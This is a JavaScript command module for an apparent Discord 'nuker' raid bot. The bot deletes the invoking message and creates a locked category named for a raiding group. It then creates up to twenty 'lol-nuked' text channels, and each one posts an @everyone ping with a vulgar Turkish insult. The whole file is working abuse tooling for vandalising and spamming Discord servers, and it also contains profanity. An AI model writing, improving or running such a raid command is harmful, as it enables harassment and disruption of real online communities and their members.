const Commando = require("discord.js-commando");
const Discord = require("discord.js");

module.exports = class TextChannelCommand extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "spamtextchannels",
      memberName: "spamtextchannels",
      group: "raid",
      description: "Metin kanallarını spamlar",
      argsType: "multiple",
      clientPermissions: ["MANAGE_CHANNELS"],
      guildOnly: true,
      throttling: {
        usages: 1,
        duration: 5,
      },
    });
  }

  async run(message, args) {
    message.delete();

    const noNumEmbed = new Discord.MessageEmbed()
      .setAuthor("Spam Metin Kanalı Komutu")
      .setFooter(
        "Pvtlvtmv Botu V3",
        "https://imgur.com/RXp1s1h"
      )
      .setDescription(
        "Hata! Geçerli bir sayı girin\n`.spamroles <sayı> | .spamroles 3`"
      )
      .setColor("#ff0000");
    if (!args[0] || isNaN(parseFloat(args[0]))) {
      message.channel.send(noNumEmbed);
      return;
    }

    var count = Math.round(args[0]);

    if (count > 20) {
      count = 20;
    }

    let categoryId = "";
    message.guild.channels
      .create("| LXG FEDAİSİ ALDI Bİ MAKAS", { type: "category" })
      .then((channel) => {
        channel.setPosition(0);
        categoryId = channel.id;
        channel.overwritePermissions([
          {
            id: message.guild.id,
            deny: ["SEND_MESSAGES"],
            allow: ["ADD_REACTIONS", "READ_MESSAGE_HISTORY", "VIEW_CHANNEL"],
          },
        ]);
      });
    let msg1;
    await message.channel
      .send(`Toplam ${count} metin kanalı oluşturuluyor...`)
      .then((m) => {
        msg1 = m;
      });

    for (let i = 1; i <= count; i++) {
      setTimeout(() => {
        message.guild.channels
          .create("lol-nuked", {
            type: "text",
            parent: categoryId,
            topic: "Epic nuker bot",
          })
          .then((channel) => {
            channel.send(`||@everyone||\nLXG FEDAİSİ GÖTTEN SİKER!`);
          });
      }, 1000);
    }

    await msg1.edit("Tamamlandı!");
    setTimeout(() => {
      msg1.delete();
    }, 5000);

    const moment = require("moment");
    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Çalıştırılan Komut: spamtextchannel`);
  }
};
